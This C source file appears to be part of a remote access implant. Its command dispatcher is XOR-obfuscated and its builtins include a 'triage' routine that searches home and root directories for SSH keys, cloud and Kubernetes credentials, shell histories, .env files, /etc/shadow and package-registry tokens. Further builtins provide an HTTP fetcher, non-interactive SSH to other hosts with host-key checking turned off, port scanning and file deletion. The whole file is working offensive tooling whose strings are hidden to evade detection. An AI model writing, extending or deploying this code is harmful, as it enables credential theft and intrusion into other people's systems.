static int triage_categorize(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    /* SSH */
    char s_id_rsa[ENC_LX_ID_RSA_LEN + 1]; xor_dec(s_id_rsa, ENC_LX_ID_RSA, ENC_LX_ID_RSA_LEN);
    char s_id_ed[ENC_LX_ID_ED25519_LEN + 1]; xor_dec(s_id_ed, ENC_LX_ID_ED25519, ENC_LX_ID_ED25519_LEN);
    char s_id_ec[ENC_LX_ID_ECDSA_LEN + 1]; xor_dec(s_id_ec, ENC_LX_ID_ECDSA, ENC_LX_ID_ECDSA_LEN);
    char s_id_dsa[ENC_LX_ID_DSA_LEN + 1]; xor_dec(s_id_dsa, ENC_LX_ID_DSA, ENC_LX_ID_DSA_LEN);
    char s_kh[ENC_LX_KNOWN_HOSTS_LEN + 1]; xor_dec(s_kh, ENC_LX_KNOWN_HOSTS, ENC_LX_KNOWN_HOSTS_LEN);
    char s_ak[ENC_LX_AUTH_KEYS_LEN + 1]; xor_dec(s_ak, ENC_LX_AUTH_KEYS, ENC_LX_AUTH_KEYS_LEN);

    if (strcmp(base, s_id_rsa) == 0 || strcmp(base, s_id_ed) == 0 ||
        strcmp(base, s_id_ec) == 0 || strcmp(base, s_id_dsa) == 0 ||
        strcmp(base, s_kh) == 0 || strcmp(base, s_ak) == 0)
        return 0;

    char s_sshd[ENC_LX_SSH_DOTDIR_LEN + 1]; xor_dec(s_sshd, ENC_LX_SSH_DOTDIR, ENC_LX_SSH_DOTDIR_LEN);
    char s_sshd2[ENC_LX_SSH_DOTDIR2_LEN + 1]; xor_dec(s_sshd2, ENC_LX_SSH_DOTDIR2, ENC_LX_SSH_DOTDIR2_LEN);
    char s_pem[ENC_LX_EXT_PEM_LEN + 1]; xor_dec(s_pem, ENC_LX_EXT_PEM, ENC_LX_EXT_PEM_LEN);
    char s_key[ENC_LX_EXT_KEY_LEN + 1]; xor_dec(s_key, ENC_LX_EXT_KEY, ENC_LX_EXT_KEY_LEN);

    if (strstr(path, s_sshd) || strstr(path, s_sshd2))
        if (strstr(base, s_pem) || strstr(base, s_key)) return 0;

    /* Cloud */
    char s_aws[ENC_LX_AWS_CRED_LEN + 1]; xor_dec(s_aws, ENC_LX_AWS_CRED, ENC_LX_AWS_CRED_LEN);
    char s_boto[ENC_LX_BOTO_LEN + 1]; xor_dec(s_boto, ENC_LX_BOTO, ENC_LX_BOTO_LEN);
    char s_kube[ENC_LX_KUBE_CONFIG_LEN + 1]; xor_dec(s_kube, ENC_LX_KUBE_CONFIG, ENC_LX_KUBE_CONFIG_LEN);
    char s_dock[ENC_LX_DOCKER_CONFIG_LEN + 1]; xor_dec(s_dock, ENC_LX_DOCKER_CONFIG, ENC_LX_DOCKER_CONFIG_LEN);

    if (strstr(path, s_aws) || strstr(path, s_boto) ||
        strstr(path, s_kube) || strstr(path, s_dock))
        return 1;

    /* Git */
    char s_gitc[ENC_LX_GITCONFIG_LEN + 1]; xor_dec(s_gitc, ENC_LX_GITCONFIG, ENC_LX_GITCONFIG_LEN);
    char s_gitcr[ENC_LX_GIT_CREDS_LEN + 1]; xor_dec(s_gitcr, ENC_LX_GIT_CREDS, ENC_LX_GIT_CREDS_LEN);

    if (strcmp(base, s_gitc) == 0 || strcmp(base, s_gitcr) == 0)
        return 2;

    /* History */
    char s_bh[ENC_LX_BASH_HISTORY_LEN + 1]; xor_dec(s_bh, ENC_LX_BASH_HISTORY, ENC_LX_BASH_HISTORY_LEN);
    char s_zh[ENC_LX_ZSH_HISTORY_LEN + 1]; xor_dec(s_zh, ENC_LX_ZSH_HISTORY, ENC_LX_ZSH_HISTORY_LEN);
    char s_shh[ENC_LX_SH_HISTORY_LEN + 1]; xor_dec(s_shh, ENC_LX_SH_HISTORY, ENC_LX_SH_HISTORY_LEN);
    char s_fh[ENC_LX_FISH_HISTORY_LEN + 1]; xor_dec(s_fh, ENC_LX_FISH_HISTORY, ENC_LX_FISH_HISTORY_LEN);

    if (strcmp(base, s_bh) == 0 || strcmp(base, s_zh) == 0 ||
        strcmp(base, s_shh) == 0 || strcmp(base, s_fh) == 0)
        return 3;

    /* Env */
    char s_env[ENC_LX_DOT_ENV_LEN + 1]; xor_dec(s_env, ENC_LX_DOT_ENV, ENC_LX_DOT_ENV_LEN);
    if (strcmp(base, s_env) == 0) return 4;
    {
        size_t blen = strlen(base);
        if (blen > 4 && strcmp(base + blen - 4, s_env) == 0) return 4;
    }

    /* Databases */
    {
        char s_sql[ENC_LX_EXT_SQL_LEN + 1]; xor_dec(s_sql, ENC_LX_EXT_SQL, ENC_LX_EXT_SQL_LEN);
        char s_db[ENC_LX_EXT_DB_LEN + 1]; xor_dec(s_db, ENC_LX_EXT_DB, ENC_LX_EXT_DB_LEN);
        char s_sqlite[ENC_LX_EXT_SQLITE_LEN + 1]; xor_dec(s_sqlite, ENC_LX_EXT_SQLITE, ENC_LX_EXT_SQLITE_LEN);
        char s_sqlite3[ENC_LX_EXT_SQLITE3_LEN + 1]; xor_dec(s_sqlite3, ENC_LX_EXT_SQLITE3, ENC_LX_EXT_SQLITE3_LEN);

        size_t blen = strlen(base);
        if (blen > 4 && (strcmp(base + blen - 4, s_sql) == 0 ||
                          strcmp(base + blen - 3, s_db) == 0))  return 5;
        if (blen > 7 && strcmp(base + blen - 7, s_sqlite) == 0) return 5;
        if (blen > 8 && strcmp(base + blen - 8, s_sqlite3) == 0) return 5;
    }

    /* Certificates */
    {
        char s_crt[ENC_LX_EXT_CRT_LEN + 1]; xor_dec(s_crt, ENC_LX_EXT_CRT, ENC_LX_EXT_CRT_LEN);
        char s_p12[ENC_LX_EXT_P12_LEN + 1]; xor_dec(s_p12, ENC_LX_EXT_P12, ENC_LX_EXT_P12_LEN);
        char s_pfx[ENC_LX_EXT_PFX_LEN + 1]; xor_dec(s_pfx, ENC_LX_EXT_PFX, ENC_LX_EXT_PFX_LEN);

        size_t blen = strlen(base);
        if (blen > 4 && (strcmp(base + blen - 4, s_crt) == 0 ||
                          strcmp(base + blen - 4, s_p12) == 0 ||
                          strcmp(base + blen - 4, s_pfx) == 0)) return 6;
    }

    /* Passwords */
    char s_shadow[ENC_LX_ETC_SHADOW_LEN + 1]; xor_dec(s_shadow, ENC_LX_ETC_SHADOW, ENC_LX_ETC_SHADOW_LEN);
    char s_htpw[ENC_LX_HTPASSWD_LEN + 1]; xor_dec(s_htpw, ENC_LX_HTPASSWD, ENC_LX_HTPASSWD_LEN);
    if (strstr(path, s_shadow) || strcmp(base, s_htpw) == 0) return 7;

    /* Tokens */
    char s_npm[ENC_LX_NPMRC_LEN + 1]; xor_dec(s_npm, ENC_LX_NPMRC, ENC_LX_NPMRC_LEN);
    char s_pypi[ENC_LX_PYPIRC_LEN + 1]; xor_dec(s_pypi, ENC_LX_PYPIRC, ENC_LX_PYPIRC_LEN);
    char s_netrc[ENC_LX_NETRC_LEN + 1]; xor_dec(s_netrc, ENC_LX_NETRC, ENC_LX_NETRC_LEN);
    if (strcmp(base, s_npm) == 0 || strcmp(base, s_pypi) == 0 ||
        strcmp(base, s_netrc) == 0) return 8;

    return -1;
}

static int triage_skip_dir(const char *path) {
    char s_proc[ENC_LX_PROC_LEN + 1]; xor_dec(s_proc, ENC_LX_PROC, ENC_LX_PROC_LEN);
    char s_sys[ENC_LX_SYS_LEN + 1];   xor_dec(s_sys, ENC_LX_SYS, ENC_LX_SYS_LEN);
    char s_dev[ENC_LX_DEV_LEN + 1];   xor_dec(s_dev, ENC_LX_DEV, ENC_LX_DEV_LEN);
    char s_run[ENC_LX_RUN_LEN + 1];   xor_dec(s_run, ENC_LX_RUN, ENC_LX_RUN_LEN);

    return (strncmp(path, s_proc, ENC_LX_PROC_LEN) == 0 ||
            strncmp(path, s_sys,  ENC_LX_SYS_LEN) == 0  ||
            strncmp(path, s_dev,  ENC_LX_DEV_LEN) == 0   ||
            strncmp(path, s_run,  ENC_LX_RUN_LEN) == 0);
}

static void triage_add_hit(const char *fpath, const struct stat *sb) {
    int cat = triage_categorize(fpath);
    if (cat < 0) return;
    if (g_triage_count >= g_triage_cap) {
        int new_cap = g_triage_cap ? g_triage_cap * 2 : 256;
        TriageHit *nh = realloc(g_triage_hits, (size_t)new_cap * sizeof(TriageHit));
        if (!nh) return;
        g_triage_hits = nh;
        g_triage_cap  = new_cap;
    }
    TriageHit *h = &g_triage_hits[g_triage_count++];
    strncpy(h->path, fpath, sizeof(h->path) - 1);
    h->path[sizeof(h->path) - 1] = '\0';
    h->size  = sb->st_size;
    h->mtime = sb->st_mtime;
    h->cat   = cat;
}

static void triage_walk(const char *dirpath, int depth) {
    if (depth > 10) return;
    if (triage_skip_dir(dirpath)) return;

    DIR *d = opendir(dirpath);
    if (!d) return;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' ||
            (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
            continue;

        char full[1024];
        int n = snprintf(full, sizeof(full), "%s/%s", dirpath, ent->d_name);
        if (n < 0 || (size_t)n >= sizeof(full)) continue;

        struct stat sb;
        if (lstat(full, &sb) != 0) continue;

        if (S_ISDIR(sb.st_mode)) {
            triage_walk(full, depth + 1);
        } else if (S_ISREG(sb.st_mode) || S_ISLNK(sb.st_mode)) {
            triage_add_hit(full, &sb);
        }
    }
    closedir(d);
}

static int builtin_triage(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *target = ltrim(args);

    free(g_triage_hits);
    g_triage_hits  = NULL;
    g_triage_count = 0;
    g_triage_cap   = 0;

    if (*target == '\0') {
        char home_path[ENC_LX_HOME_LEN + 1];
        xor_dec(home_path, ENC_LX_HOME, ENC_LX_HOME_LEN);
        char root_path[ENC_LX_ROOT_LEN + 1];
        xor_dec(root_path, ENC_LX_ROOT, ENC_LX_ROOT_LEN);
        triage_walk(home_path, 0);
        triage_walk(root_path, 0);
    } else {
        triage_walk(target, 0);
    }

    /* decode category names */
    char cat_names[TRIAGE_CATS][32];
    xor_dec(cat_names[0], ENC_LX_TCAT_SSHKEYS, ENC_LX_TCAT_SSHKEYS_LEN);
    xor_dec(cat_names[1], ENC_LX_TCAT_CLOUD,   ENC_LX_TCAT_CLOUD_LEN);
    xor_dec(cat_names[2], ENC_LX_TCAT_GIT,     ENC_LX_TCAT_GIT_LEN);
    xor_dec(cat_names[3], ENC_LX_TCAT_HISTORY,  ENC_LX_TCAT_HISTORY_LEN);
    xor_dec(cat_names[4], ENC_LX_TCAT_ENV,      ENC_LX_TCAT_ENV_LEN);
    xor_dec(cat_names[5], ENC_LX_TCAT_DB,       ENC_LX_TCAT_DB_LEN);
    xor_dec(cat_names[6], ENC_LX_TCAT_CERTS,    ENC_LX_TCAT_CERTS_LEN);
    xor_dec(cat_names[7], ENC_LX_TCAT_PASS,     ENC_LX_TCAT_PASS_LEN);
    xor_dec(cat_names[8], ENC_LX_TCAT_TOKENS,   ENC_LX_TCAT_TOKENS_LEN);
    xor_dec(cat_names[9], ENC_LX_TCAT_MISC,     ENC_LX_TCAT_MISC_LEN);

    int cats_seen = 0;
    for (int c = 0; c < TRIAGE_CATS; c++) {
        int first = 1;
        for (int i = 0; i < g_triage_count; i++) {
            if (g_triage_hits[i].cat != c) continue;
            if (first) {
                pos = out_append(buf, buf_size, pos, "[%s]\n", cat_names[c]);
                first = 0;
                cats_seen++;
            }
            char mt[20];
            struct tm tm_info;
            localtime_r(&g_triage_hits[i].mtime, &tm_info);
            strftime(mt, sizeof(mt), "%Y-%m-%d", &tm_info);
            pos = out_append(buf, buf_size, pos,
                             "  %-60s %10lld bytes  %s\n",
                             g_triage_hits[i].path,
                             (long long)g_triage_hits[i].size,
                             mt);
        }
    }

    char found_fmt[ENC_LX_TRIAGE_FOUND_LEN + 1];
    xor_dec(found_fmt, ENC_LX_TRIAGE_FOUND, ENC_LX_TRIAGE_FOUND_LEN);
    pos = out_append(buf, buf_size, pos, found_fmt, g_triage_count, cats_seen);

    free(g_triage_hits);
    g_triage_hits  = NULL;
    g_triage_count = 0;
    g_triage_cap   = 0;
    return pos;
}

/* -------------------------------------------------------------------------
 * 20. builtin_curl
 * ---------------------------------------------------------------------- */
static int builtin_curl(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *url = ltrim(args);
    if (*url == '\0') {
        char fmt[ENC_LX_USAGE_CURL_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CURL, ENC_LX_USAGE_CURL_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    /* Check scheme */
    char https_pfx[ENC_LX_HTTPS_PREFIX_LEN + 1];
    xor_dec(https_pfx, ENC_LX_HTTPS_PREFIX, ENC_LX_HTTPS_PREFIX_LEN);
    char http_pfx[ENC_LX_HTTP_PREFIX_LEN + 1];
    xor_dec(http_pfx, ENC_LX_HTTP_PREFIX, ENC_LX_HTTP_PREFIX_LEN);

    if (strncmp(url, https_pfx, ENC_LX_HTTPS_PREFIX_LEN) == 0) {
        char fmt[ENC_LX_CURL_NO_HTTPS_LEN + 1];
        xor_dec(fmt, ENC_LX_CURL_NO_HTTPS, ENC_LX_CURL_NO_HTTPS_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    const char *host_start;
    if (strncmp(url, http_pfx, ENC_LX_HTTP_PREFIX_LEN) == 0)
        host_start = url + ENC_LX_HTTP_PREFIX_LEN;
    else host_start = url;

    char host[256] = {0};
    int  port = 80;
    char path[2048] = "/";

    const char *slash = strchr(host_start, '/');
    const char *colon = strchr(host_start, ':');

    if (colon && (!slash || colon < slash)) {
        int hlen = (int)(colon - host_start);
        if (hlen >= (int)sizeof(host)) hlen = (int)sizeof(host) - 1;
        memcpy(host, host_start, (size_t)hlen);
        host[hlen] = '\0';
        port = atoi(colon + 1);
        if (slash) strncpy(path, slash, sizeof(path) - 1);
    } else if (slash) {
        int hlen = (int)(slash - host_start);
        if (hlen >= (int)sizeof(host)) hlen = (int)sizeof(host) - 1;
        memcpy(host, host_start, (size_t)hlen);
        host[hlen] = '\0';
        strncpy(path, slash, sizeof(path) - 1);
    } else {
        strncpy(host, host_start, sizeof(host) - 1);
    }
    if (host[0] == '\0') {
        char fmt[ENC_LX_CURL_INVAL_URL_LEN + 1];
        xor_dec(fmt, ENC_LX_CURL_INVAL_URL, ENC_LX_CURL_INVAL_URL_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    struct in_addr addr;
    if (inet_aton(host, &addr) == 0) {
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) {
            char fmt[ENC_LX_CURL_RESOLVE_LEN + 1];
            xor_dec(fmt, ENC_LX_CURL_RESOLVE, ENC_LX_CURL_RESOLVE_LEN);
            return out_append(buf, buf_size, 0, fmt, host);
        }
        addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
        freeaddrinfo(res);
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        char fmt[ENC_LX_CURL_SOCKET_LEN + 1];
        xor_dec(fmt, ENC_LX_CURL_SOCKET, ENC_LX_CURL_SOCKET_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    struct timeval tv = { 10, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr        = addr;

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(fd);
        char fmt[ENC_LX_CURL_CONNECT_LEN + 1];
        xor_dec(fmt, ENC_LX_CURL_CONNECT, ENC_LX_CURL_CONNECT_LEN);
        return out_append(buf, buf_size, 0, fmt, host, port, strerror(errno));
    }

    /* send HTTP request */
    char req_fmt[ENC_LX_HTTP_GET_REQ_LEN + 1];
    xor_dec(req_fmt, ENC_LX_HTTP_GET_REQ, ENC_LX_HTTP_GET_REQ_LEN);
    char req[1024];
    int req_len = snprintf(req, sizeof(req), req_fmt, path, host);
    if (write(fd, req, (size_t)req_len) != req_len) {
        close(fd);
        char fmt[ENC_LX_CURL_SEND_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CURL_SEND_ERR, ENC_LX_CURL_SEND_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    char rbuf[4096];
    ssize_t n;
    while ((n = read(fd, rbuf, sizeof(rbuf))) > 0) {
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, rbuf, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(fd);
    return pos;
}

/* -------------------------------------------------------------------------
 * 21. builtin_ssh
 * ---------------------------------------------------------------------- */
static int builtin_ssh(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *p = ltrim(args);
    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_SSH_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_SSH, ENC_LX_USAGE_SSH_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    const char *sp = strchr(p, ' ');
    char target[256] = {0};
    const char *remote_cmd = NULL;
    if (sp) {
        int tlen = (int)(sp - p);
        if (tlen >= (int)sizeof(target)) tlen = (int)sizeof(target) - 1;
        memcpy(target, p, (size_t)tlen);
        target[tlen] = '\0';
        remote_cmd = ltrim(sp);
    } else {
        strncpy(target, p, sizeof(target) - 1);
    }

    /* decode ssh argv strings */
    char ssh_cmd[ENC_LX_SSH_CMD_LEN + 1];
    xor_dec(ssh_cmd, ENC_LX_SSH_CMD, ENC_LX_SSH_CMD_LEN);
    char ssh_o[ENC_LX_SSH_OPT_O_LEN + 1];
    xor_dec(ssh_o, ENC_LX_SSH_OPT_O, ENC_LX_SSH_OPT_O_LEN);
    char ssh_strict[ENC_LX_SSH_STRICTHOST_LEN + 1];
    xor_dec(ssh_strict, ENC_LX_SSH_STRICTHOST, ENC_LX_SSH_STRICTHOST_LEN);
    char ssh_batch[ENC_LX_SSH_BATCH_LEN + 1];
    xor_dec(ssh_batch, ENC_LX_SSH_BATCH, ENC_LX_SSH_BATCH_LEN);
    char ssh_timeout[ENC_LX_SSH_TIMEOUT_LEN + 1];
    xor_dec(ssh_timeout, ENC_LX_SSH_TIMEOUT, ENC_LX_SSH_TIMEOUT_LEN);

    const char *argv_arr[16];
    int ai = 0;
    argv_arr[ai++] = ssh_cmd;
    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_strict;
    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_batch;
    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_timeout;
    argv_arr[ai++] = target;
    if (remote_cmd && *remote_cmd)
        argv_arr[ai++] = remote_cmd;
    argv_arr[ai] = NULL;

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        char fmt[ENC_LX_SSH_PIPE_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_SSH_PIPE_ERR, ENC_LX_SSH_PIPE_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        char fmt[ENC_LX_SSH_FORK_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_SSH_FORK_ERR, ENC_LX_SSH_FORK_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(ssh_cmd, (char *const *)argv_arr);
        _exit(127);
    }

    close(pipefd[1]);

    fd_set rfds;
    struct timeval deadline = { 30, 0 };
    ssize_t n;
    while (1) {
        FD_ZERO(&rfds);
        FD_SET(pipefd[0], &rfds);
        int r = select(pipefd[0] + 1, &rfds, NULL, NULL, &deadline);
        if (r <= 0) break;
        char tmp[4096];
        n = read(pipefd[0], tmp, sizeof(tmp));
        if (n <= 0) break;
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, tmp, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
    return pos;
}

/* =========================================================================
 * builtin_dispatch — public entry point
 * ====================================================================== */
int builtin_dispatch(const char *cmd, char *out_buf, int buf_size) {
    if (buf_size > 0) out_buf[0] = '\0';

    /* --- exact-match builtins --- */
    if (xor_eq(cmd, ENC_CMD_WHOAMI, ENC_CMD_WHOAMI_LEN) ||
        xor_eq(cmd, ENC_CMD_ID, ENC_CMD_ID_LEN)) {
        builtin_whoami(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_HOSTNAME, ENC_CMD_HOSTNAME_LEN)) {
        builtin_hostname(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_PWD, ENC_CMD_PWD_LEN)) {
        builtin_pwd(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_ENV, ENC_CMD_ENV_LEN)) {
        builtin_env(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_PS, ENC_CMD_PS_LEN)) {
        builtin_ps(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_IPCONFIG, ENC_CMD_IPCONFIG_LEN) ||
        xor_eq(cmd, ENC_CMD_IFCONFIG, ENC_CMD_IFCONFIG_LEN)) {
        builtin_ifconfig(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_NETSTAT, ENC_CMD_NETSTAT_LEN)) {
        builtin_netstat(out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_TRIAGE, ENC_CMD_TRIAGE_LEN)) {
        builtin_triage("", out_buf, buf_size);
        return 1;
    }

    /* --- ls (exact + prefix) --- */
    if (xor_eq(cmd, ENC_CMD_LS_BARE, ENC_CMD_LS_BARE_LEN)) {
        builtin_ls("", out_buf, buf_size);
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_LS_SP, ENC_CMD_LS_SP_LEN)) {
        builtin_ls(cmd + ENC_CMD_LS_SP_LEN, out_buf, buf_size);
        return 1;
    }

    /* --- filebrowser (exact + prefix) --- */
    if (xor_eq(cmd, ENC_CMD_FILEBROWSER_BARE, ENC_CMD_FILEBROWSER_BARE_LEN)) {
        builtin_filebrowser("", out_buf, buf_size);
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_FILEBROWSER, ENC_CMD_FILEBROWSER_LEN)) {
        builtin_filebrowser(cmd + ENC_CMD_FILEBROWSER_LEN, out_buf, buf_size);
        return 1;
    }

    /* --- prefix-match builtins --- */
    if (xor_eq(cmd, ENC_CMD_CD_BARE, ENC_CMD_CD_BARE_LEN)) {
        builtin_cd("", out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CD_SP, ENC_CMD_CD_SP_LEN)) {
        builtin_cd(cmd + ENC_CMD_CD_SP_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CAT, ENC_CMD_CAT_LEN)) {
        builtin_cat(cmd + ENC_CMD_CAT_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_MKDIR, ENC_CMD_MKDIR_LEN)) {
        builtin_mkdir(cmd + ENC_CMD_MKDIR_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_RM, ENC_CMD_RM_LEN)) {
        builtin_rm(cmd + ENC_CMD_RM_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CP, ENC_CMD_CP_LEN)) {
        builtin_cp(cmd + ENC_CMD_CP_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_MV, ENC_CMD_MV_LEN)) {
        builtin_mv(cmd + ENC_CMD_MV_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CHMOD, ENC_CMD_CHMOD_LEN)) {
        builtin_chmod(cmd + ENC_CMD_CHMOD_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_GETENV, ENC_CMD_GETENV_LEN)) {
        builtin_getenv(cmd + ENC_CMD_GETENV_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_KILL, ENC_CMD_KILL_LEN)) {
        builtin_kill_cmd(cmd + ENC_CMD_KILL_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_PORTSCAN, ENC_CMD_PORTSCAN_LEN)) {
        builtin_portscan(cmd + ENC_CMD_PORTSCAN_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CURL, ENC_CMD_CURL_LEN)) {
        builtin_curl(cmd + ENC_CMD_CURL_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_SSH, ENC_CMD_SSH_LEN)) {
        builtin_ssh(cmd + ENC_CMD_SSH_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_TRIAGE_SP, ENC_CMD_TRIAGE_SP_LEN)) {
        builtin_triage(cmd + ENC_CMD_TRIAGE_SP_LEN, out_buf, buf_size);
        return 1;
    }

    return 0; /* not a builtin */
}
